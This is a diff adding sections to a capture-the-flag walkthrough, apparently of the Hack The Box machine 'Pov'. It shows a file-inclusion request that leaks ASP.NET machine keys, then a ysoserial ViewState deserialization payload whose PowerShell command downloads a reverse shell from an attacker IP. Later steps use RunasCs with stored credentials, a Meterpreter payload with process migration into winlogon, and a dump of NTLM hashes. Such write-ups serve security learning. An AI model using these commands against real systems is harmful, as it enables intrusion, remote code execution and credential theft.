@@ -112,3 +112,159 @@ Responder then catches the following hash for the user `sfitz`
 
 Unfortunately this hash cannot be cracked with hashcat and `rockyou.txt`
 
+---
+---
+## Leverage LFI to leak webconfig
+
+```sh
+POST /portfolio/ HTTP/1.1
+Host: dev.pov.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 395
+Origin: http://dev.pov.htb
+Connection: close
+Referer: http://dev.pov.htb/portfolio/
+Upgrade-Insecure-Requests: 1
+
+__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=tOistpMlhQCea%2BBFaIWqyhJUON%2FKqhG%2BqYoaYHBAMZ1Q95Ui%2B6irjjc%2BwFG4Fpi3%2FC7OKsdhjN71SHBHBeJNPzRodzE%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=JJiCVexImCV%2BTgxJq58ftt1K6k7sjKA5828zuIaD%2FliQ%2FSKfzvtgdiTCU%2Ffo3HOmHJm4OUgCrKAitKO5zyT%2B8WMjJnUnO1mRB6iDHzrMS1eF5eZN5dJFEW9GM0iK70bfal3oBw%3D%3D&file=/web.config
+```
+This leaks the following web config file:
+```sh
+<configuration>
+  <system.web>
+    <customErrors mode="On" defaultRedirect="default.aspx" />
+    <httpRuntime targetFramework="4.5" />
+    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
+  </system.web>
+    <system.webServer>
+        <httpErrors>
+            <remove statusCode="403" subStatusCode="-1" />
+            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
+        </httpErrors>
+        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
+    </system.webServer>
+</configuration>
+```
+
+Now that we know the decryption type and the key, we can utilize the `ysoserial`exploit which uses a vulnerability in the `__VIEWSTATE` deserialization
+
+---
+---
+## VIEWSTATE deserialization to get user
+
+#### Step 1: Generate deserialization payload
+
+```sh
+./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.16.45:9001/Invoke-PowerShellTcp.ps1')" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+```
+
+#### Step 2: Download and configure Invoke-PowerShellTcp.ps1 + Python web server on attacker machine
+
+```sh
+wget https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+
+Invoke-PowerShellTcp -Reverse -IPAddress <Attacker-IP> -Port 9443
+
+sudo python3 -m http.server 9001
+```
+
+#### Step 3: Send payload over as exploit
+
+```sh
+__EVENTTARGET=download&
+__EVENTARGUMENT=&
+__VIEWSTATE=<DESERIALIZED_PAYLOAD>&
+__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=JJiCVexImCV%2BTgxJq58ftt1K6k7sjKA5828zuIaD%2FliQ%2FSKfzvtgdiTCU%2Ffo3HOmHJm4OUgCrKAitKO5zyT%2B8WMjJnUnO1mRB6iDHzrMS1eF5eZN5dJFEW9GM0iK70bfal3oBw%3D%3D&file=/web.config
+```
+
+---
+---
+## Pivoting from sfitz -> alaading
+
+In the Documents folder for the sfitz user we see the following PSCredentials file
+
+```sh
+PS C:\Users\sfitz\Documents> $credential = Import-Clixml -Path "c:\users\sfitz\documents\connection.xml"
+PS C:\Users\sfitz\Documents> echo ($credential.UserName + ":" + $credential.GetNetworkCredential().Password)
+```
+
+This gives us the creds from the user `alaading`:`xxxx8fynP44xxxx`
+
+We can now use the `RunasCs.exe` to execute commands as the `alaading` user as follows and gain a shell:
+```sh
+.\RunasCs.exe alaading xxxx8fynP44xxxx "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.16.45:9001/Invoke-PowerShellTcp.ps1')"
+```
+
+#### THIS GIVES THE USER FLAG AT: C:\Users\alaading\Desktop\user.txt
+
+---
+---
+## Gaining root
+
+When inspecting the privs of the the user alaading we see the `SeDebugPrivilege` as Enabled
+
+thus we can gain root as follows:
+
+#### Step 1:
+meterpreter payload
+```sh
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[Port] -f exe -o payload.exe
+```
+
+#### Step 2:
+then run msfconsole and setup a listener
+```
+msf > use exploit/multi/handler
+msf exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST [IP]
+msf exploit(handler) > set LPORT [Port]
+msf exploit(handler) > exploit
+```
+
+#### Step 3:
+you are gonna then upload that payload to your victim machine
+
+Attacker Machine:
+```sh
+python -m http.server 80
+```
+Victim Machine:
+```powershell
+(New-Object Net.WebClient).DownloadFile('<TargetFileURL>','<OutputFileName>')
+```
+
+#### Step 4:
+and then run it start .\payload.exe on victim machine, you will get a connection on your msfconsole
+
+#### Step 5:
+then you will check for windLogon pid
+```powershell
+msf> shell
+C:\Users\Public> powershell Get-Process winlogon     # Assume PID of 556
+```
+
+#### Step 6:
+then on your msfconsole you are gonna migrate to that pid
+```sh
+migrate 556
+```
+
+#### Step 7:
+and from there you run `shell` and get root from `C:\Users\Administrator\Desktop\root.txt`
+
+---
+---
+## Hashes from box
+
+```sh
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7c883121d0f63ee5b4312ba7572689b:::
+alaading:1001:aad3b435b51404eeaad3b435b51404ee:31c0583909b8349cbe92961f9dfa5dbf:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+sfitz:1000:aad3b435b51404eeaad3b435b51404ee:012e5ed95e8745ea5180f81648b6ec94:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1fa5b00b7c6cc4ac2807c4d5b3dd3dab:::
+```
